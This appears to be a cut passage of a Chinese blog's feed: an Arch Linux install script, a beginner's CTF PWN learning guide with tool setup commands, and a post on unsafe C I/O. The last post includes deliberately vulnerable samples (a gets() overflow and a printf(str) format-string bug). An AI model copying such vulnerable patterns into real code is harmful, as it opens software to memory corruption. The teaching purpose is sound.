    <link href="/2023/05/28/Arch-Linux-DDE/"/>
    <url>/2023/05/28/Arch-Linux-DDE/</url>
    
    <content type="html"><![CDATA[<h1 id="Arch-Linux-DDE"><a href="#Arch-Linux-DDE" class="headerlink" title="Arch-Linux-DDE"></a>Arch-Linux-DDE</h1><p><strong>已废弃！！！！仅做纪念用途！！详细步骤可跟部分b站视频一步一步来。</strong></p><p><em>目前本机已迁移至Ubuntu2210</em></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sh">reflector -p https -c China --latest 5 --<span class="hljs-built_in">sort</span> rate --save /etc/pacman.d/mirrorlist<br><span class="hljs-comment"># 跟m1的走分区</span><br>pacstrap /mnt linux linux-firmware base base-devel vim<br>genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br>arch-chroot /mnt<br>pacman -S dhcpcd networkmanager<br><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br><span class="hljs-comment"># 将zh_US和zh_CN 两个UTF-8注释取消</span><br>locale-gen<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;LANG=en_US.UTF-8&#x27;</span> &gt; /etc/locale.conf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;arch&#x27;</span> &gt; /etc/hostname <span class="hljs-comment"># arch &gt; your arch&#x27;s name</span><br><span class="hljs-comment"># vim初始化/etc/hosts像教程一样</span><br>passwd<br>pacman -S grub efibootmgr amd-ucode<br>grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=ARCH<br>grub-mkconfig -o /boot/grub/grub.cfg<br><span class="hljs-built_in">exit</span><br>umount -R /mnt<br>reboot<br><br></code></pre></td></tr></table></figure><p>2023.12.6更新：感觉不如archinstall()</p><p><a href="https://zhuanlan.zhihu.com/p/596227524">Arch Linux 详细安装教程，萌新再也不怕了！「2023.05」 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/568981775">Arch Linux 安装后该做什么？Arch Linux 使用指南与推荐配置「2023.05」 - 知乎 (zhihu.com)</a></p><p><a href="https://www.yuque.com/misery333/sz1apr/mf4gi2zg2d68k9nk#WflkG">archlinux个人踩坑记录 (yuque.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>逆向大类-PWN入门指南（新）</title>
    <link href="/2023/05/22/%E9%80%86%E5%90%91%E5%A4%A7%E7%B1%BB-PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%EF%BC%88%E6%96%B0%EF%BC%89/"/>
    <url>/2023/05/22/%E9%80%86%E5%90%91%E5%A4%A7%E7%B1%BB-PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%EF%BC%88%E6%96%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="PWN入门指南"><a href="#PWN入门指南" class="headerlink" title="PWN入门指南"></a>PWN入门指南</h1><h2 id="0x01-pwn是什么"><a href="#0x01-pwn是什么" class="headerlink" title="0x01 pwn是什么"></a>0x01 pwn是什么</h2><ol><li>pwn：“Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似 “砰”，对黑客而言，这<br> 就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑 或手机就被你操纵。</li><li>CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE 或者Linux下的<br> ELF文件等），然后参赛选手通过对二进制程序进行逆向分析和调 试来找到利用漏洞，并编写利用<br> 代码，通过远程代码执行来达到溢出攻击的效果， 最终拿到目标机器的shell夺取flag。</li><li>二进制逆向可以概括为 从目标代码反推到源代码，再通过源代码去理解该文件的 实现的功能和创<br> 作的意义，这项技术在实战中常应用的领域为 软件破解、漏洞挖掘、恶意木马的分析。</li><li>对于Pwn选手来说，未来会更容易接触到KOH赛题，也更考验人们对于代码审计的能力以及对于各种关于底层漏洞知识的掌握。</li></ol><h2 id="0x02-基础知识"><a href="#0x02-基础知识" class="headerlink" title="0x02 基础知识"></a>0x02 基础知识</h2><h3 id="1-C语言"><a href="#1-C语言" class="headerlink" title="1.C语言"></a>1.C语言</h3><p><strong>零基础的同学，从C语言的学习开始</strong><br>视频推荐：<a href="https://www.icourse163.org/course/ZJU-199001">中国大学mooc：翁恺教授-C语言入门</a><br>练习平台：<a href="https://pintia.cn/">PTA | 程序设计类实验辅助教学平台</a>、<a href="https://www.luogu.com.cn/">首页 - 洛谷 | 计算机科学教育新生态</a><br>在之后，学有余力的同学，可以学习简单的数据结构和算法</p><h3 id="2-汇编语言"><a href="#2-汇编语言" class="headerlink" title="2.汇编语言"></a>2.汇编语言</h3><p><strong>推荐：王爽《汇编语言》</strong><br><strong>最后的目的是能看懂汇编代码，不用实现手搓汇编程序</strong><br>早期学习中的目标：<strong>了解</strong>以下指令的作用 , 寄存器的作用 , 寻址方式（此处为x86指令集部分指令，未来会出现更多的指令集）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov<br>add<br>sub<br>inc<br>dec<br>lea<br>cmp<br>test<br>je<br>jne<br>jmp<br>call<br>push<br>pop<br>and<br>or<br>xor<br></code></pre></td></tr></table></figure><h3 id="3-python基础"><a href="#3-python基础" class="headerlink" title="3.python基础"></a>3.python基础</h3><p>在C语言基础扎实的情况下，python是很容易入门的<br>在做pwn题的时候，是通过python脚本与程序和工具进行关联，所以需要学习python<br>python包括python2 和 python3 ，学习中注意python2和python3的诸多区别，尤其是python3中str<br>类型与bytes类型的区分与转换</p><p>（但现在更多师傅在做题时会选用Python3，Python2.7环境是每个Ubuntu标准环境中自带的，也同时兼容一些仅低版本的工具的使用。推荐版本 3.7.* 3.8.*）</p><h3 id="4-linux基础"><a href="#4-linux基础" class="headerlink" title="4.linux基础"></a>4.linux基础</h3><p><strong>目的是能够运用基本的shell命令</strong><br>简单的linux命令行的使用<br>pwn的很多工具是只有linux版本的，所以需要简单的学习</p><p>（注：不是特别建议直接将本机系统换为类Linux，双系统可行）</p><h2 id="0x03-大致路线-amp-资料"><a href="#0x03-大致路线-amp-资料" class="headerlink" title="0x03 大致路线&amp;资料"></a>0x03 大致路线&amp;资料</h2><p><strong>刷题平台推荐：</strong><a href="https://nssctf.cn/">NSSCTF</a>、<a href="https://adworld.xctf.org.cn/">攻防世界</a>、<a href="https://buuoj.cn/">BuuCTF</a>、<a href="https://pwnhub.cn/">PWNHUB</a>、<a href="https://ctf.show/">CTFShow</a>、<a href="https://pwnable.tw/">Pwnable(TW)</a>、<a href="https://pwnable.kr/">Pwnable(KR)</a>、<a href="https://pwn.college/">PwnCollege</a> （排名不分先后，以个人对本方向做题体验排序）<br><strong>学习资料：</strong><a href="https://ctf-wiki.org/">CTF-wiki文字资料</a>、<a href="https://www.bilibili.com/video/BV1Uv411j7fr?vd_source=704b83ee478726f09f748dc03c2257ae">星盟安全PWN全集视频资料</a><br><strong>比赛查询：</strong><a href="https://su-sanha.cn/">三哈</a><br><strong>安全平台：</strong>看雪、FreeBuf、安全客、先知、吾爱破解<br><strong>相关书籍推荐：</strong>《有趣的二进制》《深入理解计算机系统》 《程序员的自我修养》 《0day漏洞挖掘与<br>利用》</p><p>由于本方向相对其他方向资源偏少，更需要个人的思考、调试的熟练程度，以及对于资料的找寻能力</p><h3 id="1-栈"><a href="#1-栈" class="headerlink" title="1.栈"></a><strong>1.栈</strong></h3><p><strong>基本ROP：ret2text , ret2shellcode , ret2syscall, ret2libc</strong><br>这些学习完，就可以在ctf平台上开始刷题练手了</p><p><strong>ctfwiki中其他构造ROP的技巧：ret2csu, ret2reg等等</strong><br>之后的ret2dl_resolve等技巧有难度，可以暂放</p><h3 id="2-格式化字符串漏洞"><a href="#2-格式化字符串漏洞" class="headerlink" title="2.格式化字符串漏洞"></a><strong>2.格式化字符串漏洞</strong></h3><p>学习如何利用漏洞实现 泄露内存 和 覆盖内存<br>包括泄露栈上内容，泄露BSS段上内容等等</p><h3 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a><strong>3.堆</strong></h3><p>在学习堆之前，先熟悉数据结构<strong>“链表”</strong>，包括单向链表，双向循环链表等等<br><strong>推荐学习顺序：UAF –&gt; Fastbin Attack –&gt; Unlink –&gt; ……</strong></p><h2 id="附-环境搭建-amp-工具安装"><a href="#附-环境搭建-amp-工具安装" class="headerlink" title="附:环境搭建&amp;工具安装"></a>附:环境搭建&amp;工具安装</h2><h3 id="1-linux系统安装"><a href="#1-linux系统安装" class="headerlink" title="1.linux系统安装"></a>1.linux系统安装</h3><p>通过虚拟机 如:<strong>VMware</strong>实现 (也可以双系统，开心就好)<br>再于虚拟机中搭建linux系统：最好为Ubuntu<br>初期所接触的ctf-pwn题,多为libc2.23, 所以前期至少需要安装ubuntu16的系统</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ubuntu16</span><span class="hljs-params">(glibc2.<span class="hljs-number">23</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ubuntu18</span><span class="hljs-params">(glibc2.<span class="hljs-number">27</span>_ &lt;=<span class="hljs-number">1.2</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ubuntu18</span><span class="hljs-params">(glibc2.<span class="hljs-number">27</span>_ &gt;=<span class="hljs-number">1.3</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ubuntu20</span><span class="hljs-params">(glibc2.<span class="hljs-number">31</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ubuntu22</span><span class="hljs-params">(glibc2.<span class="hljs-number">34</span>)</span></span><br></code></pre></td></tr></table></figure><p>但由于后续某些工具也在同步更新，导致ubuntu16可能不能很好地安装这些工具，所以此处我们更推荐使用Ubutnu20.04</p><h3 id="2-Ubuntu20-04以及python2环境下进行安装"><a href="#2-Ubuntu20-04以及python2环境下进行安装" class="headerlink" title="2.Ubuntu20.04以及python2环境下进行安装"></a>2.Ubuntu20.04以及python2环境下进行安装</h3><p>(注：如果是ubuntu18及以上版本最好且应该采用Pyhton3的安装方式，如未注明Python2&#x2F;3，则更希望读者采取Python3的方法；如果希望使用Python2版本的安装也可以在GitHub上找到某些特定的低版本，但所有的Python2版本我们都是不建议的)</p><h4 id="0-IDA"><a href="#0-IDA" class="headerlink" title="0. IDA"></a>0. IDA</h4><p>用于逆向程序，呈现出可以阅读的汇编代码<br>(在windows下安装，群里有资源；在linux下可以使用wine或去官网下载ida free（不建议），或直接使用ghidra，不建议使用cutter)</p><h4 id="1-ubuntu20-04"><a href="#1-ubuntu20-04" class="headerlink" title="1. ubuntu20.04"></a>1. ubuntu20.04</h4><p>虚拟机安装，VMware Workstation Pro+ ubuntu20.04的iso文件<br>vmtools安装：<a href="https://blog.csdn.net/adminkeys/article/details/107914813">https://blog.csdn.net/adminkeys/article/details/107914813</a></p><h4 id="2-apt更新："><a href="#2-apt更新：" class="headerlink" title="2. apt更新："></a>2. apt更新：</h4><p>在本处往后内容都需要在命令行中</p><p>由于国外源相对较慢，推荐上网搜索您使用的Ubuntu版本换源，然后根据教程操作后进行如下操作：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt update<br><span class="hljs-comment"># sudo apt upgrade</span><br><span class="hljs-comment"># upgrade可选，为本地所有已安装包体的更新</span><br></code></pre></td></tr></table></figure><h4 id="3-python2-7"><a href="#3-python2-7" class="headerlink" title="3. python2.7:"></a>3. python2.7:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#非必要</span><br>sudo apt install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential<br></code></pre></td></tr></table></figure><h4 id="4-pip"><a href="#4-pip" class="headerlink" title="4. pip:"></a>4. pip:</h4><p>用于快捷的安装其他软件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#不直接用apt进行更新，python2会崩，但不建议</span><br>sudo apt install wget<br>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py<br>sudo python2 ./get-pip.py<br><span class="hljs-comment">#或</span><br>sudo apt install python-pip<br><br><span class="hljs-comment">#python3安装</span><br>sudo apt install python3-pip<br></code></pre></td></tr></table></figure><h4 id="5-git-gdb-gdb-mutiarch"><a href="#5-git-gdb-gdb-mutiarch" class="headerlink" title="5. git, gdb, gdb-mutiarch"></a>5. git, gdb, gdb-mutiarch</h4><p>git用于克隆代码托管他人项目<br>gdb用于调试程序<br>gdb-mutiarch在之后用于arm架构的调试（但可能更常搭配qemu使用）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get install git gdb<br><span class="hljs-comment"># 非必要</span><br><span class="hljs-comment"># sudo apt-get install gdb-multiarch</span><br><span class="hljs-comment"># sudo apt-get install &quot;binfmt*&quot;</span><br></code></pre></td></tr></table></figure><h4 id="6-pwndbg-gdb的插件"><a href="#6-pwndbg-gdb的插件" class="headerlink" title="6. pwndbg(gdb的插件)"></a>6. pwndbg(gdb的插件)</h4><p>因为gdb对于pwn题的调试不便，所以需要通过功能更适合的插件pwndbg进行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br>gedit ./setup.sh<br><span class="hljs-comment">#注释掉这一行：$&#123;PYTHON&#125; -m pip install $&#123;INSTALLFLAGS&#125; --upgrade pip</span><br>./setup.sh<br><span class="hljs-comment">#如果第一遍安装有对于capstone的报错，则</span><br>gedit requirements.txr<br><span class="hljs-comment">#将capstone==4.0.1修改为capstone==5.0.0</span><br><span class="hljs-comment">#最好多执行几次，并且保证网络环境通畅，没有任何报错即可停止，如后续使用工具出现问题重新执行本操作</span><br></code></pre></td></tr></table></figure><h4 id="7-pwntools"><a href="#7-pwntools" class="headerlink" title="7. pwntools"></a>7. pwntools</h4><p>python pypi的一个库，集合了一整套pwn工具集，涵盖了pwn题利用脚本所需要的各种工具。包括方便<br>的IO交互函数，ROP、格式化字符串等利用的自动化工具，shellcode生成器等等。<br>pwntools是目前最好用也是仅有的大型pwn利用框架。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#python2.7 不建议</span><br>sudo pip install setuptools==44.0<br>sudo pip install MarkupSafe==0.9.2<br>sudo pip install cryptography==2.5<br>sudo pip install configparser==3.5<br>sudo pip install zipp==0.5<br>sudo pip install importlib-metadata==0.12<br>sudo pip install importlib-resources==1.0<br>sudo pip install pwntools==4<br><br><span class="hljs-comment">#python3安装</span><br>pip install pwntools<br><br><span class="hljs-comment">#Python2.7也可以pip install pwntools，不过同时需要pip install pathlib2</span><br></code></pre></td></tr></table></figure><h4 id="8-ROPgadget-pwntools的一个组件"><a href="#8-ROPgadget-pwntools的一个组件" class="headerlink" title="8. ROPgadget(pwntools的一个组件)"></a>8. ROPgadget(pwntools的一个组件)</h4><p>在栈溢出的基础上，可以利用程序中已有的小片段(gadgets)改变某些寄存器或者变量的值，便于控<br>制程序的执行流<br>而ROPgadget可以实现方便地查找好用的gadgets</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#校验是否安装成功</span><br>ROPgadget -v<br></code></pre></td></tr></table></figure><h4 id="9-LibcSearcher"><a href="#9-LibcSearcher" class="headerlink" title="9. LibcSearcher"></a>9. LibcSearcher</h4><p>用于解决pwn题中不明libc版本的问题，可以根据泄露的某函数地址,推测服务端使用的libc版本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#python2 不建议</span><br>git <span class="hljs-built_in">clone</span> https://github.com/wjhwjhn/LibcSearcher.git<br><span class="hljs-built_in">cd</span> LibcSearcher<br>python2 setup.py develop<br><span class="hljs-comment">#python3安装</span><br>pip3 install LibcSearcher<br></code></pre></td></tr></table></figure><h4 id="10-one-gadget"><a href="#10-one-gadget" class="headerlink" title="10. one_gadget"></a>10. one_gadget</h4><p>由于在ubuntu16.04下安装ruby默认且最高版本为2.3，需要高版本ruby才能安装本工具，可参考如下文章：<a href="https://blog.csdn.net/henryhu712/article/details/89224467">https://blog.csdn.net/henryhu712/article/details/89224467</a><br>在高版本ubuntu中可以直接安装（Ruby&gt;&#x3D;2.4.0）</p><p>由于是国外源，并且gem下载没有提示，多等待一会就好了，下同</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install ruby<br>sudo gem install one_gadget<br></code></pre></td></tr></table></figure><h4 id="11-seccomp-tools"><a href="#11-seccomp-tools" class="headerlink" title="11. seccomp_tools"></a>11. seccomp_tools</h4><p>检查sanbox保护用的工具（Ruby&gt;&#x3D;2.4.0）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo gem install seccomp-tools<br></code></pre></td></tr></table></figure><h4 id="12-patchelf"><a href="#12-patchelf" class="headerlink" title="12. patchelf"></a>12. patchelf</h4><p>修改ELF文件的动态链接库以及链接脚本文件，常配合glibc-all-in-one使用，大多数情况下直接apt下载即可，部分情况需要从源码自行编译构建（注：在Ubuntu18下patchelf会使链接后的文件失效，故不建议在Ubuntu18上使用）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt install patchelf<br></code></pre></td></tr></table></figure><h4 id="13-pwngdb"><a href="#13-pwngdb" class="headerlink" title="13. pwngdb"></a>13. pwngdb</h4><p>在后续堆题的学习中会大大提升学习效率，但由于会影响pwndbg canary指令，所以建议进行后续学习时再进行下载</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git <br><span class="hljs-built_in">cp</span> ./Pwndbg/.gdbinit ./<br><span class="hljs-comment">#因为你使用的时pwndbg，所以还需如下操作</span><br>gedit .gdbinit<br><span class="hljs-comment">#将第一行 source ~/peda/peda.py 用 # 注释掉或直接删掉</span><br><span class="hljs-comment">#然后添加上如下一行，在第一行</span><br><span class="hljs-built_in">source</span> ~/pwndbg/gdbinit.py<br></code></pre></td></tr></table></figure><p>理论上做完这些操作<code>.gdbinit</code>文件中应该是这样的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#source ~/peda/peda.py</span><br><span class="hljs-built_in">source</span> ~/pwndbg/gdbinit.py<br><span class="hljs-built_in">source</span> ~/Pwngdb/pwngdb.py<br><span class="hljs-built_in">source</span> ~/Pwngdb/angelheap/gdbinit.py<br><br>define hook-run<br>python<br>import angelheap<br>angelheap.init_angelheap()<br>end<br>end<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>以开发为主并提及内存管理</title>
    <link href="/2023/05/11/%E4%BB%A5%E5%BC%80%E5%8F%91%E4%B8%BA%E4%B8%BB%E5%B9%B6%E6%8F%90%E5%8F%8A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2023/05/11/%E4%BB%A5%E5%BC%80%E5%8F%91%E4%B8%BA%E4%B8%BB%E5%B9%B6%E6%8F%90%E5%8F%8A%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="编写本文章缘由"><a href="#编写本文章缘由" class="headerlink" title="编写本文章缘由"></a>编写本文章缘由</h2><p>在pwn学习过程中，我们可以了解到，由于早期语言更希望使用者编写程序时自己去进行内存管理并写出安全的程序，导致如类c语言早期开发时由于开发者编写的不安全代码逻辑，从而一些人可以恶意利用编写的漏洞进行攻击并可能破坏被攻击者的设备。</p><p>由于大多数代码编写后编译或执行等功能都是由编译器的开发者进行调整，所以本篇文章我们会尽量避免对于汇编等更底层的内容进行研究，只会对实现的层面进行探讨，对于汇编等内容的研究是并无意义的。</p><p>在本篇文章中我们也会总结一些编写程序的正确方法或一些特殊语法，方便大家在开发的路上也能够写出令自己满意的且安全的程序。</p><h2 id="一些输入函数"><a href="#一些输入函数" class="headerlink" title="一些输入函数"></a>一些输入函数</h2><p>主要提及一些常见的函数，其在非正确使用时可能并不安全。</p><h3 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h3><h4 id="类Linux"><a href="#类Linux" class="headerlink" title="类Linux"></a>类Linux</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span></span>;<br><span class="hljs-comment">/*出错返回值-1并设置errno</span><br><span class="hljs-comment">正常返回成功读取的字节数</span><br><span class="hljs-comment">在unistd.h头文件中定义*/</span><br></code></pre></td></tr></table></figure><h4 id="不限平台"><a href="#不限平台" class="headerlink" title="不限平台"></a>不限平台</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">scanf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, ...)</span></span>;<br>std::cin std::basic_istream<br>cin.<span class="hljs-built_in">getline</span>(string str); <span class="hljs-comment">// getline(cin, string str)</span><br><span class="hljs-function"><span class="hljs-type">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-type">char</span> *s, <span class="hljs-type">int</span> size, FILE *stream)</span></span>;<br><span class="hljs-built_in">gets</span>(<span class="hljs-type">char</span> *str); <span class="hljs-comment">// 在 ISO c11/c++11 中已废弃，由于其并不安全</span><br></code></pre></td></tr></table></figure><p>此上函数无一例外出现了一个很严重的问题：当其对C语言中被常见或常提到的“字符串”，即char类型的数组进行输入的时候，如若不做限制，只要输入的字量足够大，就一定会超出数组的范围导致溢出。</p><h3 id="Pascal"><a href="#Pascal" class="headerlink" title="Pascal"></a>Pascal</h3><p>read readln</p><h4 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h4><p>fmt.Scanf()</p><h3 id="不安全的情况的例"><a href="#不安全的情况的例" class="headerlink" title="不安全的情况的例"></a>不安全的情况的例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> str[<span class="hljs-number">50</span>];<br>    gets(str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一段看起来非常简单的程序，大多数人可能都写过类似的内容。假设这段程序在编译时编译参数没有开启一些常见的保护（如PIE和Canary），我们就可以通过非常简单的栈溢出操作去获得程序所在环境的shell。这并不需要攻击者很多时间，因为这是一个对二进制漏洞学习者来说非常基础的内容。</p><h2 id="某些输出函数"><a href="#某些输出函数" class="headerlink" title="某些输出函数"></a>某些输出函数</h2><p>在此并不多说，因为大多数的语言已经规避了格式化字符串漏洞，如：Ruby、Python，在此仅提及类C语言中的printf函数。</p><p>printf(const char *format, …);</p><p>可能大家并没有想到这个是什么漏洞，我在此举一例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> str[<span class="hljs-number">20</span>];<br>    read(<span class="hljs-number">0</span>, str, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">printf</span>(str);<br>    <span class="hljs-comment">// 并不是printf(&quot;%s&quot;, str);</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>是的，如上面这段代码，如果存在此漏洞，理论上我们可以修改内存中任意一处可写的区域。可能有人在怀疑，怎么会有人这么写呢？而在早期开发中，由于printf函数的第一个参数format是char *类型的，所以部分开发者直接向format参数传字符串，而printf可以读，甚至可以用%n这个格式化字符对内存进行覆盖实现写操作，这样就导致了别有用心的开发者可以直接利用这一段内容进行攻击。</p><h3 id="如何在C-中自己实现printf"><a href="#如何在C-中自己实现printf" class="headerlink" title="如何在C++中自己实现printf"></a>如何在C++中自己实现printf</h3><p>在cstdarg头文件中定义了</p><p>T va_arg(std::va_list ap, T);</p><p>va_arg宏展开成对应来自std::va_list ap的下个参数的T类型表达式，其中ap为std::va_list类型的实例，T为ap中下一个参数的类型，于是，printf函数就可以写成：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> __cdecl _printf(<span class="hljs-type">char</span> <span class="hljs-type">const</span>* <span class="hljs-type">const</span> Format, ...) &#123;<br>    <span class="hljs-type">int</span> Result;<br>va_list ArgList;<br><span class="hljs-built_in">va_start</span>(ArgList, Format);<br>Result = <span class="hljs-built_in">vfprintf</span>(stdout, Format, ArgList);<br><span class="hljs-built_in">va_end</span>(ArgList);<br><span class="hljs-keyword">return</span> Result;<br>&#125;<br></code></pre></td></tr></table></figure><p>选自 mq白cpp BV1Ky4y1o76s</p><h3 id="如何在C-中实现类似于Python中的print"><a href="#如何在C-中实现类似于Python中的print" class="headerlink" title="如何在C++中实现类似于Python中的print"></a>如何在C++中实现类似于Python中的print</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span>... 